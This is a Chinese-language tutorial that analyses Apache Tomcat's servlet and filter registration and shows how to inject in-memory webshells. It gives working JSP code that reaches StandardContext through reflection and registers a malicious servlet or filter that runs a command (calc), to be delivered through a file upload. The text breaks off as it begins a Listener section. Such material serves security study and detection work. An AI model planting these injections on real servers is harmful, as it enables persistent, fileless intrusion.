<h1 id="kPHZw">Servlet内存马</h1>
<h2 id="EFVAE">前置基础</h2>
首先创建一个JavaWeb项目

在项目中较为重要的是web.xml，servlet、fliter等就是在该文件中配置

其中创建好的servlet的配置是使用注解完成的，我们将注解删除，到web.xml中配置路径

```java
package com.source.servlet;

import java.io.*;
import javax.servlet.http.*;
import javax.servlet.annotation.*;

@WebServlet(name = "helloServlet", value = "/hello-servlet")
public class HelloServlet extends HttpServlet {
    private String message;

    public void init() {
        message = "Hello World!";
    }

    public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
        response.setContentType("text/html");

        // Hello
        PrintWriter out = response.getWriter();
        out.println("<html><body>");
        out.println("<h1>" + message + "</h1>");
        out.println("</body></html>");
    }

    public void destroy() {
    }
}
```

配置好的web.xml文件如下

```java
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">
    <servlet>
        <servlet-name>HelloWorld</servlet-name>
        <servlet-class>com.source.servlet.HelloServlet</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>HelloWorld</servlet-name>
        <url-pattern>hello-servlet</url-pattern>
    </servlet-mapping>
</web-app>
```

除此之外，我们还需要在pom.xml中导入tomcat的包

```java
<dependency>
            <groupId>org.apache.tomcat</groupId>
            <artifactId>tomcat-catalina</artifactId>
            <version>8.5.61</version>
        </dependency>
```

<h2 id="F0nyF">分析</h2>
**这里分析的是servlet的注册流程**

tomcat解析xml文件的具体流程在这里不分析，我们直接看到解析xml文件后做注册的地方`ContextConfig#configureContext`

启动服务时走入该方法后，即可看到有两个自带的servlet和我们自己配置的serlvet

注册大概流程如下

1. 创建一个wrapper
2. 设置servlet的名字
3. 设置servlet相关联的类
4. 将wrapper加入到context中
5. 配置路径

```java
private void configureContext(WebXml webxml) {
        ......
        for (ServletDef servlet : webxml.getServlets().values()) {
            //创建一个wrapper
            Wrapper wrapper = context.createWrapper();
            // Description is ignored
            // Display name is ignored
            // Icons are ignored

            // jsp-file gets passed to the JSP Servlet as an init-param

            if (servlet.getLoadOnStartup() != null) {
                //预加载
                //serlvet一般在访问后创建，如果设置相关配置，即可在访问创建
                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());
            }
            if (servlet.getEnabled() != null) {
                wrapper.setEnabled(servlet.getEnabled().booleanValue());
            }
            //设置servlet名字
            wrapper.setName(servlet.getServletName());
            Map<String,String> params = servlet.getParameterMap();
            for (Entry<String, String> entry : params.entrySet()) {
                wrapper.addInitParameter(entry.getKey(), entry.getValue());
            }
            wrapper.setRunAs(servlet.getRunAs());
            Set<SecurityRoleRef> roleRefs = servlet.getSecurityRoleRefs();
            for (SecurityRoleRef roleRef : roleRefs) {
                wrapper.addSecurityReference(
                        roleRef.getName(), roleRef.getLink());
            }
            //设置关联的类
            wrapper.setServletClass(servlet.getServletClass());
            MultipartDef multipartdef = servlet.getMultipartDef();
            if (multipartdef != null) {
                long maxFileSize = -1;
                long maxRequestSize = -1;
                int fileSizeThreshold = 0;

                if(null != multipartdef.getMaxFileSize()) {
                    maxFileSize = Long.parseLong(multipartdef.getMaxFileSize());
                }
                if(null != multipartdef.getMaxRequestSize()) {
                    maxRequestSize = Long.parseLong(multipartdef.getMaxRequestSize());
                }
                if(null != multipartdef.getFileSizeThreshold()) {
                    fileSizeThreshold = Integer.parseInt(multipartdef.getFileSizeThreshold());
                }

                wrapper.setMultipartConfigElement(new MultipartConfigElement(
                        multipartdef.getLocation(),
                        maxFileSize,
                        maxRequestSize,
                        fileSizeThreshold));
            }
            if (servlet.getAsyncSupported() != null) {
                wrapper.setAsyncSupported(
                        servlet.getAsyncSupported().booleanValue());
            }
            wrapper.setOverridable(servlet.isOverridable());
            //将wrapper加入到context中
            context.addChild(wrapper);
        }
        for (Entry<String, String> entry :
                webxml.getServletMappings().entrySet()) {
            //配置路径
            context.addServletMappingDecoded(entry.getKey(), entry.getValue());
        }
        ......
    }
```

![](https://cdn.nlark.com/yuque/0/2025/png/44744277/1739005198296-1e557b46-7ef5-421e-9fd2-3789d09c4ff4.png)

<h2 id="RawDe">实现</h2>
<h3 id="ijOdI">实现条件</h3>
要实现内存马，有两个条件

1. 写一个木马 servlet
2. 将servlet注册入tomcat中

<h3 id="EOb1t">写马</h3>
我们仿照默认的Servlet来写一个恶意类，使我们的主机弹计算器即可（jsp中定义东西需要使用**<%! %>**）

```java
<%!
public class HelloServlet extends HttpServlet {
    private String message;

    public void init() {
        message = "Hello World!";
    }

    public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
        Runtime.getRuntime().exec("calc");
    }

    public void destroy() {
    }
}
%>
```

<h3 id="SKVlQ">动态注册servlet</h3>
<h4 id="wrhMU">动态注册中分为两步</h4>
1. 获取standardcontext
2. 注册进tomcat

<h4 id="RI6hI">获取standardcontext</h4>
在jsp中默认有一个request对象，这个对象中存在一个`getServletContext`方法，会获取一个servletContext

在动态调试中，我们可以看到，servletContext中存在一个`ApplicationContext`，而在ApplicationContext中即存在着`standardcontext`，是我们想要获取的对象

![](https://cdn.nlark.com/yuque/0/2025/png/44744277/1739015119729-b05691d2-3ebf-4eb8-a52c-4a4a27ee1935.png)

接下来我们就要通过`servletContext`来获取`standardcontext`

由于私有属性无法直接被获取，所以我们要通过反射特性来获取属性

```java
<%
  ServletContext servletContext = request.getServletContext();
  Field context = servletContext.getClass().getDeclaredField("context");
  context.setAccessible(true);
  ApplicationContext applicationContext =(ApplicationContext) context.get(servletContext);

  Field standardContext = applicationContext.getClass().getDeclaredField("context");
  standardContext.setAccessible(true);
  StandardContext context1 = (StandardContext) standardContext.get(applicationContext);
%>
```

<h4 id="iBIuw">注册进tomcat</h4>
注册进tomcat就和下面分析的流程是一样的，但不需要加多余的判断等东西

但是注册的过程中多一个实例化Servlet并setServlet的步骤

```java
<%
//获取standardcontext
  ServletContext servletContext = request.getServletContext();
  Field context = servletContext.getClass().getDeclaredField("context");
  context.setAccessible(true);
  ApplicationContext applicationContext =(ApplicationContext) context.get(servletContext);

  Field standardContext = applicationContext.getClass().getDeclaredField("context");
  standardContext.setAccessible(true);
  StandardContext context1 = (StandardContext) standardContext.get(applicationContext);

//注册进tomcat
  Wrapper wrapper = context1.createWrapper();
  wrapper.setName("MemServlet");
  wrapper.setServletClass(MemServlet.class.getName());
  //实例化Servlet
  wrapper.setServlet(new MemServlet());

  context1.addChild(wrapper);
  context1.addServletMappingDecoded("/mem","MemServlet");
%>
```

<h4 id="hExho">激活</h4>
想要访问内存马，就要访问我们创建的jsp文件，创建**恶意类**与**servlet**并注册进tomcat中

![](https://cdn.nlark.com/yuque/0/2025/png/44744277/1739015658597-798813c5-3d5e-43ef-bbbc-561ddb4093dc.png)

然后即可访问我们所设定的内存马路径，触发恶意代码

![](https://cdn.nlark.com/yuque/0/2025/png/44744277/1739015701777-4f3b363a-8e57-43d6-90b4-07fbb8c49c03.png)

<h1 id="cia0D">Filter内存马</h1>
<font style="color:rgb(80, 80, 92);">从图中可以看出，我们的请求会经过 filter 之后才会到 Servlet ，那么如果我们动态创建一个 filter 并且将其放在最前面，我们的 filter 就会最先执行，当我们在 filter 中添加恶意代码，就会进行命令执行，这样也就成为了一个内存 Webshell</font>

![](https://cdn.nlark.com/yuque/0/2025/png/44744277/1739971340388-3ad6b685-a309-48d8-a9c8-8aec01b51498.png)

<h2 id="BHGFN">分析</h2>
<font style="color:rgb(80, 80, 92);">首先在IDEA中创建Servlet，并导入tomcat依赖</font>

+ Tomcat 8.5.76

```java
<dependency>  
 <groupId>org.apache.tomcat</groupId>  
 <artifactId>tomcat-catalina</artifactId>  
 <version>8.5.81</version>  
 <scope>provided</scope>  
 </dependency>
```

在我们的项目中构造一个Filter类`memFilter`

```java
public class memFilter implements Filter {
    public void init(FilterConfig config) throws ServletException {
        System.out.println("OK");
    }

    public void destroy() {

    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException {
        System.out.println("filter success");
        chain.doFilter(request, response);
    }
}
```

修改web.xml，将该filter与路径绑定，即只有访问/filter时才会触发filter拦截器

```java
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">

    <filter>
        <filter-name>filter</filter-name>
        <filter-class>memFilter</filter-class>
    </filter>
    <filter-mapping>
        <filter-name>filter</filter-name>
        <url-pattern>/filter</url-pattern>
    </filter-mapping>
</web-app>
```

<h3 id="bXsSe">访问/filter后</h3>
<font style="color:rgb(80, 80, 92);">我们在 filter.java 下的 doFilter 这个地方打断点，并且访问 /filter 接口，断下来开始调试</font>

![](https://cdn.nlark.com/yuque/0/2025/png/44744277/1739972523121-b4c3ebbc-9779-433c-894e-4e50321f0ec9.png)

步入`ApplicationFilterChain#doFilter`，`Globals.IS_SECURITY_ENABLED `用来判断一下是否开启全局服务，默认不开启

```java
@Override
    public void doFilter(ServletRequest request, ServletResponse response)
        throws IOException, ServletException {

        if( Globals.IS_SECURITY_ENABLED ) {
            final ServletRequest req = request;
            final ServletResponse res = response;
            try {
                java.security.AccessController.doPrivileged(
                    new java.security.PrivilegedExceptionAction<Void>() {
                        @Override
                        public Void run()
                            throws ServletException, IOException {
                            internalDoFilter(req,res);
                            return null;
                        }
                    }
                );
            } catch( PrivilegedActionException pe) {
                Exception e = pe.getException();
                if (e instanceof ServletException) {
                    throw (ServletException) e;
                } else if (e instanceof IOException) {
                    throw (IOException) e;
                } else if (e instanceof RuntimeException) {
                    throw (RuntimeException) e;
                } else {
                    throw new ServletException(e.getMessage(), e);
                }
            }
        } else {
            internalDoFilter(request,response);
        }
    }
```

跳到最后的else中，进入到`internalDoFilter`方法

```java
private void internalDoFilter(ServletRequest request,
                                  ServletResponse response)
        throws IOException, ServletException {

        // Call the next filter if there is one
        if (pos < n) {
            ApplicationFilterConfig filterConfig = filters[pos++];
            try {
                Filter filter = filterConfig.getFilter();

                if (request.isAsyncSupported() && "false".equalsIgnoreCase(
                        filterConfig.getFilterDef().getAsyncSupported())) {
                    request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE);
                }
                if( Globals.IS_SECURITY_ENABLED ) {
                    final ServletRequest req = request;
                    final ServletResponse res = response;
                    Principal principal =
                        ((HttpServletRequest) req).getUserPrincipal();

                    Object[] args = new Object[]{req, res, this};
                    SecurityUtil.doAsPrivilege ("doFilter", filter, classType, args, principal);
                } else {
                    filter.doFilter(request, response, this);
                }
            } catch (IOException | ServletException | RuntimeException e) {
                throw e;
            } catch (Throwable e) {
                e = ExceptionUtils.unwrapInvocationTargetException(e);
                ExceptionUtils.handleThrowable(e);
                throw new ServletException(sm.getString("filterChain.filter"), e);
            }
            return;
        }

        // We fell off the end of the chain -- call the servlet instance
        try {
            if (ApplicationDispatcher.WRAP_SAME_OBJECT) {
                lastServicedRequest.set(request);
                lastServicedResponse.set(response);
            }

            if (request.isAsyncSupported() && !servletSupportsAsync) {
                request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR,
                        Boolean.FALSE);
            }
            // Use potentially wrapped request from this point
            if ((request instanceof HttpServletRequest) &&
                    (response instanceof HttpServletResponse) &&
                    Globals.IS_SECURITY_ENABLED ) {
                final ServletRequest req = request;
                final ServletResponse res = response;
                Principal principal =
                    ((HttpServletRequest) req).getUserPrincipal();
                Object[] args = new Object[]{req, res};
                SecurityUtil.doAsPrivilege("service",
                                           servlet,
                                           classTypeUsedInService,
                                           args,
                                           principal);
            } else {
                servlet.service(request, response);
            }
        } catch (IOException | ServletException | RuntimeException e) {
            throw e;
        } catch (Throwable e) {
            e = ExceptionUtils.unwrapInvocationTargetException(e);
            ExceptionUtils.handleThrowable(e);
            throw new ServletException(sm.getString("filterChain.servlet"), e);
        } finally {
            if (ApplicationDispatcher.WRAP_SAME_OBJECT) {
                lastServicedRequest.set(null);
                lastServicedResponse.set(null);
            }
        }
    }
```

filter是从filters[pos++]中获取的，其中定义如下

```java
private ApplicationFilterConfig[] filters = new ApplicationFilterConfig[0];
```

filters其中存在两个filter，一个是tomcat本身自带的，另一个就是我们所定义的

> 我们查找用法，其中写入值的方法只有`ApplicationFilterChain`的`addFilter`方法中
>
> ![](https://cdn.nlark.com/yuque/0/2025/png/44744277/1739974979952-7621ab1b-ae28-422f-b56e-2383039abd99.png)
>
> 而addFilter所调用的地方也只有`ApplicationFilterFactory`中`createFilterChain`的两个位置，剩下的调用会在后面与这里呼应
>
> ![](https://cdn.nlark.com/yuque/0/2025/png/44744277/1739975105993-2fd6a174-e712-4a6f-8c93-f10276349fbb.png)
>

现在pos是1，所以目前得到的filter是tomcat的filter，下面执行`filter.doFilter(request, response, this);`（这里我的IDEA无法走入WsFilter的doFilter方法QAQ）

![](https://cdn.nlark.com/yuque/0/2025/png/44744277/1739973063712-75d8dbd2-840b-4511-8723-5c39536be414.png)

在WsFilter的doFilter方法中，往下走会走到`<font style="color:rgb(80, 80, 92);">chain.doFilter()</font>`<font style="color:rgb(80, 80, 92);">，会回到 </font>`ApplicationFilterChain`<font style="color:rgb(80, 80, 92);"> 类的 DoFilter() 方法里面</font>

![](https://cdn.nlark.com/yuque/0/2025/png/44744277/1739973469688-422a88fc-fcad-42a8-8f4a-e55a59abcd7e.png)

+ 这里理解一下，我们是filterchain，因此需要一个一个获取filter，直到获取到最后一个，很正常的一个链式调用

当pos > n时，就会跳出if中，经过中间一些判断，最后走到`servlet.service(request, response);`

<h3 id="SZLEc">访问/filter前</h3>
我们想要实现filter内存马，就要明白filter是如何被创建并注册的（调用流程如下）

![](https://cdn.nlark.com/yuque/0/2025/png/44744277/1739974131159-d7c2321f-3fbd-476e-8f88-3ba2bc9427d4.png)

我们选到`StandardWrapperValve`的`invoke`方法中

```java
@Override
    public final void invoke(Request request, Response response)
        throws IOException, ServletException {
        
        ......
        
        MessageBytes requestPathMB = request.getRequestPathMB();
        DispatcherType dispatcherType = DispatcherType.REQUEST;
        if (request.getDispatcherType()==DispatcherType.ASYNC) {
            dispatcherType = DispatcherType.ASYNC;
        }
        request.setAttribute(Globals.DISPATCHER_TYPE_ATTR,dispatcherType);
        request.setAttribute(Globals.DISPATCHER_REQUEST_PATH_ATTR,
                requestPathMB);
        // Create the filter chain for this request
        ApplicationFilterChain filterChain =
                ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);

        // Call the filter chain for this request
        // NOTE: This also calls the servlet's service() method
        Container container = this.container;
        try {
            if ((servlet != null) && (filterChain != null)) {
                // Swallow output if needed
                if (context.getSwallowOutput()) {
                    try {
                        SystemLogHandler.startCapture();
                        if (request.isAsyncDispatching()) {
                            request.getAsyncContextInternal().doInternalDispatch();
                        } else {
                            filterChain.doFilter(request.getRequest(),
                                    response.getResponse());
                        }
                    } finally {
                        String log = SystemLogHandler.stopCapture();
                        if (log != null && log.length() > 0) {
                            context.getLogger().info(log);
                        }
                    }
                } else {
                    if (request.isAsyncDispatching()) {
                        request.getAsyncContextInternal().doInternalDispatch();
                    } else {
                        filterChain.doFilter
                            (request.getRequest(), response.getResponse());
                    }
                }

            }
        } 
        ......
    }
```

其中存在一个`createFilterChain`方法，会构建一个filterchain，方法代码如下

```java
public static ApplicationFilterChain createFilterChain(ServletRequest request,
            Wrapper wrapper, Servlet servlet) {

        // If there is no servlet to execute, return null
        if (servlet == null) {
            return null;
        }

        // Create and initialize a filter chain object
        ApplicationFilterChain filterChain = null;
        if (request instanceof Request) {
            Request req = (Request) request;
            if (Globals.IS_SECURITY_ENABLED) {
                // Security: Do not recycle
                filterChain = new ApplicationFilterChain();
            } else {
                filterChain = (ApplicationFilterChain) req.getFilterChain();
                if (filterChain == null) {
                    filterChain = new ApplicationFilterChain();
                    req.setFilterChain(filterChain);
                }
            }
        } else {
            // Request dispatcher in use
            filterChain = new ApplicationFilterChain();
        }

        filterChain.setServlet(servlet);
        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());

        // Acquire the filter mappings for this Context
        StandardContext context = (StandardContext) wrapper.getParent();
        FilterMap filterMaps[] = context.findFilterMaps();

        // If there are no filter mappings, we are done
        if ((filterMaps == null) || (filterMaps.length == 0)) {
            return filterChain;
        }

        // Acquire the information we will need to match filter mappings
        DispatcherType dispatcher =
                (DispatcherType) request.getAttribute(Globals.DISPATCHER_TYPE_ATTR);

        String requestPath = null;
        Object attribute = request.getAttribute(Globals.DISPATCHER_REQUEST_PATH_ATTR);
        if (attribute != null){
            requestPath = attribute.toString();
        }

        String servletName = wrapper.getName();

        // Add the relevant path-mapped filters to this filter chain
        for (FilterMap filterMap : filterMaps) {
            if (!matchDispatcher(filterMap, dispatcher)) {
                continue;
            }
            if (!matchFiltersURL(filterMap, requestPath)) {
                continue;
            }
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)
                    context.findFilterConfig(filterMap.getFilterName());
            if (filterConfig == null) {
                // FIXME - log configuration problem
                continue;
            }
            filterChain.addFilter(filterConfig);
        }

        // Add filters that match on servlet name second
        for (FilterMap filterMap : filterMaps) {
            if (!matchDispatcher(filterMap, dispatcher)) {
                continue;
            }
            if (!matchFiltersServlet(filterMap, servletName)) {
                continue;
            }
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)
                    context.findFilterConfig(filterMap.getFilterName());
            if (filterConfig == null) {
                // FIXME - log configuration problem
                continue;
            }
            filterChain.addFilter(filterConfig);
        }

        // Return the completed filter chain
        return filterChain;
    }
```

`filterMaps[]`属性是从context执行`findFilterMaps`方法后所返回的

```java
    @Override
    public FilterMap[] findFilterMaps() {
        return filterMaps.asArray();
    }
```

![](https://cdn.nlark.com/yuque/0/2025/png/44744277/1740022403092-db28fc42-94a7-4919-9ec1-a405edd7079d.png)

其中`filterChain.addFilter(filterConfig);`会将filter加入到filterChain中

要想执行到`filterChain.addFilter(filterConfig);`，我们需要保证filterMaps与filterConfig不为空

```java
if ((filterMaps == null) || (filterMaps.length == 0)) {
            return filterChain;
        }

 for (FilterMap filterMap : filterMaps) {
            if (!matchDispatcher(filterMap, dispatcher)) {
                continue;
            }
            if (!matchFiltersURL(filterMap, requestPath)) {
                continue;
            }
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)
                    context.findFilterConfig(filterMap.getFilterName());
            if (filterConfig == null) {
                // FIXME - log configuration problem
                continue;
            }
            filterChain.addFilter(filterConfig);
        }
```

<h3 id="obF3g">小结流程</h3>
<h4 id="Bwlh4">执行invoke方法</h4>
层层调用invoke，对filterChain执行addFilter方法，构造好filterChain

<h4 id="SH7Hi">拿出filterchain</h4>
进行`dofilter`工作，对filterchain中的filter一个一个进行链式调用

<h4 id="WnYOh">最后一个filter</h4>
在最后一个filter执行完`doFilter`方法后，跳到`<font style="color:rgb(83, 83, 96);background-color:rgb(242, 242, 242);">Servlet.service()</font>`

<h4 id="qrB6I">攻击思路</h4>
我们的攻击代码，应该在`StandardContext#findFilterConfig`中生效，从filterConfigs获取filter，可以保证我们的每次请求都会触发恶意filter，若在其他位置加入filter，可能只会在本次请求中触发恶意filter

```java
public FilterConfig findFilterConfig(String name) {
        return filterConfigs.get(name);
    }
```

<font style="color:rgb(80, 80, 92);">我们只需要构造含有恶意的 filter 的</font><font style="color:rgb(80, 80, 92);"> </font>**filterConfig**<font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">和拦截器</font><font style="color:rgb(80, 80, 92);"> </font>**filterMaps**<font style="color:rgb(80, 80, 92);">，就可以达到触发目的了，并且它们都是从 StandardContext 中来的。</font>

<font style="color:rgb(80, 80, 92);">而这个 filterMaps 中的数据对应 web.xml 中的 filter-mapping 标签</font>

```java
<?xml version="1.0" encoding="UTF-8"?>  
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"  
 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  
 xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"  
 version="4.0">  
 <filter> <filter-name>filter</filter-name>  
 <filter-class>filter</filter-class>  
 </filter>  
 <filter-mapping> <filter-name>filter</filter-name>  
 <url-pattern>/filter</url-pattern>  
 </filter-mapping></web-app>
```

<h3 id="OnoJl">思路分析</h3>
`StandardContext`<font style="color:rgb(80, 80, 92);"> 这个类是一个容器类，它负责存储整个 Web 应用程序的数据和对象，并加载了 web.xml 中配置的多个 Servlet、Filter 对象以及它们的映射关系。</font>

在该类中，<font style="color:rgb(80, 80, 92);">有以下三个与filter有关的成员变量</font>

> 1. <font style="color:rgb(80, 80, 92);">filterConfigs 成员变量是一个HashMap对象，里面存储了filter名称与对应的</font>`ApplicationFilterConfig`<font style="color:rgb(80, 80, 92);">对象的键值对，在</font>`ApplicationFilterConfig`<font style="color:rgb(80, 80, 92);">对象中则存储了Filter实例以及该实例在web.xml中的注册信息。</font>
> 2. <font style="color:rgb(80, 80, 92);">filterDefs 成员变量成员变量是一个HashMap对象，存储了filter名称与相应</font>`FilterDef`<font style="color:rgb(80, 80, 92);">的对象的键值对，而</font>`FilterDef`<font style="color:rgb(80, 80, 92);">对象则存储了Filter包括名称、描述、类名、Filter实例在内等与filter自身相关的数据</font>
> 3. <font style="color:rgb(80, 80, 92);">filterMaps 中的</font>`FilterMap`<font style="color:rgb(80, 80, 92);">则记录了不同filter与</font>`UrlPattern`<font style="color:rgb(80, 80, 92);">的映射关系</font>
>

我们需要找到一个方法，去修改`filterMaps`，它对应的是web.xml中的filter-mapping标签，也就是**路径**与**filter-name**的对应关系

+ 而我们后面说的`<font style="color:rgb(80, 80, 92);">filterDef</font>`<font style="color:rgb(80, 80, 92);">，对应的就是web.xml中的filter标签，是</font>**<font style="color:rgb(80, 80, 92);">Filter类</font>**<font style="color:rgb(80, 80, 92);">与</font>**<font style="color:rgb(80, 80, 92);">filter-name</font>**<font style="color:rgb(80, 80, 92);">的对应关系</font>

在`StandardContext`<font style="color:rgb(80, 80, 92);">类中存在两个方法，可以向</font>`<font style="color:rgb(80, 80, 92);">filterMaps</font>`<font style="color:rgb(80, 80, 92);">中添加数据</font>

```java
@Override
public void addFilterMap(FilterMap filterMap) {
    validateFilterMap(filterMap);
    // Add this filter mapping to our registered set
    filterMaps.add(filterMap);
    fireContainerEvent("addFilterMap", filterMap);
}

@Override
public void addFilterMapBefore(FilterMap filterMap) {
    validateFilterMap(filterMap);
    // Add this filter mapping to our registered set
    filterMaps.addBefore(filterMap);
    fireContainerEvent("addFilterMap", filterMap);
}
```

修改`filterDef`，在`StandardContext`<font style="color:rgb(80, 80, 92);">类中存在着方法</font>`<font style="color:rgb(80, 80, 92);">addFilterDef</font>`

```java
public void addFilterDef(FilterDef filterDef) {

        synchronized (filterDefs) {
            filterDefs.put(filterDef.getFilterName(), filterDef);
        }
        fireContainerEvent("addFilterDef", filterDef);

    }
```

最后的`filterConfig`，在`StandardContext`<font style="color:rgb(80, 80, 92);">类中存在着方法</font>`<font style="color:rgb(80, 80, 92);">filterStart</font>`<font style="color:rgb(80, 80, 92);">，该方法中的</font>`<font style="color:rgb(80, 80, 92);">filterConfigs.put(name, filterConfig);</font>`<font style="color:rgb(80, 80, 92);">部分完成了</font>`<font style="color:rgb(80, 80, 92);">filterConfig</font>`<font style="color:rgb(80, 80, 92);">的添加。在后续实现过程中，可以调用</font>`<font style="color:rgb(80, 80, 92);">StandardContext#filterStart</font>`<font style="color:rgb(80, 80, 92);">方法完成添加，也可以直接调用</font>`<font style="color:rgb(80, 80, 92);">filterConfigs.put(name, filterConfig);</font>`<font style="color:rgb(80, 80, 92);">，道理都是一样的</font>

```java
public boolean filterStart() {

        if (getLogger().isDebugEnabled()) {
            getLogger().debug("Starting filters");
        }
        // Instantiate and record a FilterConfig for each defined filter
        boolean ok = true;
        synchronized (filterConfigs) {
            filterConfigs.clear();
            for (Entry<String,FilterDef> entry : filterDefs.entrySet()) {
                String name = entry.getKey();
                if (getLogger().isDebugEnabled()) {
                    getLogger().debug(" Starting filter '" + name + "'");
                }
                try {
                    ApplicationFilterConfig filterConfig =
                            new ApplicationFilterConfig(this, entry.getValue());
                    filterConfigs.put(name, filterConfig);
                } catch (Throwable t) {
                    t = ExceptionUtils.unwrapInvocationTargetException(t);
                    ExceptionUtils.handleThrowable(t);
                    getLogger().error(sm.getString(
                            "standardContext.filterStart", name), t);
                    ok = false;
                }
            }
        }

        return ok;
    }

```

<h2 id="AFHVe">实现</h2>
servlet内存马相似，依旧是写马+动态注册

<h3 id="l8hXT">构造思路</h3>
<font style="color:rgb(80, 80, 92);">通过前文分析，得出构造的主要思路如下  
</font><font style="color:rgb(80, 80, 92);">1、获取当前应用的ServletContext对象  
</font><font style="color:rgb(80, 80, 92);">2、通过ServletContext对象再获取filterConfigs  
</font><font style="color:rgb(80, 80, 92);">2、接着实现自定义想要注入的filter对象  
</font><font style="color:rgb(80, 80, 92);">4、然后为自定义对象的filter创建一个FilterDef  
</font><font style="color:rgb(80, 80, 92);">5、最后把 ServletContext对象、filter对象、FilterDef全部都设置到filterConfigs即可完成内存马的实现</font>

<h3 id="RXwTZ">filter内存马的实现</h3>
> 这里是实现代码执行，不对内存马的回显进行分析
>

实现动态注册，首先需要通过反射来获取`StandardContext`（和servlet内存马一样）

```java
  ServletContext servletContext = request.getSession().getServletContext();
  Field appctx = servletContext.getClass().getDeclaredField("context");
  appctx.setAccessible(true);
  ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

  Field stdctx = applicationContext.getClass().getDeclaredField("context");
  stdctx.setAccessible(true);
  StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
```

<font style="color:rgb(80, 80, 92);">由前面</font>**<font style="color:rgb(80, 80, 92);">Filter实例存储分析</font>**<font style="color:rgb(80, 80, 92);">得知 </font>`StandardContext`<font style="color:rgb(80, 80, 92);"> Filter实例存放在filterConfigs、filterDefs、filterConfigs这三个变量里面，将fifter添加到这三个变量中即可将内存马打入。</font>

```java
  String filterName = "cmdFilter";

  FilterDef def = new FilterDef();
  def.setFilterName(filterName);
  def.setFilter(shellFilter);
  def.setFilterClass(shellFilter.getClass().getName());

  FilterMap map = new FilterMap();
  map.setFilterName(filterName);
  map.addURLPattern("/mem");

  standardContext.addFilterDef(def);
  standardContext.addFilterMapBefore(map);
  standardContext.filterStart();

  out.println("success");
```

将上述代码整理好后，写入网站上的一个jsp文件中（利用方式：文件上传）

```jsx
<%--
  Created by IntelliJ IDEA.
  User: Andu1n
  Date: 2025/2/19
  Time: 19:33
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="javax.security.auth.login.ConfigurationSpi" %>
<%@ page import="java.io.ObjectInputFilter" %>
<html>
<head>
    <title>Title</title>
</head>
<body>
<%
  ServletContext servletContext = request.getSession().getServletContext();
  Field appctx = servletContext.getClass().getDeclaredField("context");
  appctx.setAccessible(true);
  ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

  Field stdctx = applicationContext.getClass().getDeclaredField("context");
  stdctx.setAccessible(true);
  StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

  Filter shellFilter = new Filter() {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
      Runtime.getRuntime().exec("calc");
    }

    @Override
    public void destroy() {

    }

  };

  String filterName = "cmdFilter";

  FilterDef def = new FilterDef();
  def.setFilterName(filterName);
  def.setFilter(shellFilter);
  def.setFilterClass(shellFilter.getClass().getName());

  FilterMap map = new FilterMap();
  map.setFilterName(filterName);
  map.addURLPattern("/mem");

  standardContext.addFilterDef(def);
  standardContext.addFilterMapBefore(map);
  standardContext.filterStart();

  out.println("success");

%>

</body>
</html>

```

启动tomcat服务，访问addFilter.jsp，执行我们的jsp代码

回显success，说明我们前面的代码都已经执行成功，完成了内存马的注入

![](https://cdn.nlark.com/yuque/0/2025/png/44744277/1740024176570-94403153-3034-4c3f-9c3e-fe9b5dbb800c.png)

后续访问我们设定好的内存马路径，成功执行代码

![](https://cdn.nlark.com/yuque/0/2025/png/44744277/1740024260413-8f70c49f-e9ef-4c05-96bd-98bebce1d826.png)



<h1 id="ruLRI">Listener内存马</h1>
<h2 id="drSHJ">前置基础</h2>
<font style="color:rgb(80, 80, 92);">Java Web 开发中的监听器（Listener）就是 Application、Session 和 Request 三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。</font>

**<font style="color:rgb(80, 80, 92);">Listener三个域对象</font>**

+ ServletContextListener
+ HttpSessionListener
+ ServletRequestListener

